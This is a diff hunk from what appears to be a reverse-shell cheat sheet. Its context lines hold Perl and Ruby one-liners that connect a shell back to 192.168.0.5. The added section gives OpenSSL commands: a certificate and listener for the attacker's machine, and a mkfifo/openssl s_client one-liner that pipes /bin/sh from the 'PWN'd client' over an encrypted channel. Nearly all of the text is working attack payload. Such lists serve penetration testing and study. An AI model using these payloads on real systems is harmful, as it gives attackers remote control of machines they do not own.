@@ -46,6 +46,19 @@ perl -e 'use Socket;$i="192.168.0.5";$p=4545;socket(S,PF_INET,SOCK_STREAM,getpro
 ruby -rsocket -e'f=TCPSocket.open("192.168.0.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
+#### OpenSSL:
+
+On your machine (to receive, not a normal TCP connection)
+```
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes # generate some arbitrary cert
+openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
+```
+
+On PWN'd client
+```
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.0.5:4444 > /tmp/s; rm /tmp/s
+```
+
 #### Java :
 
 ```
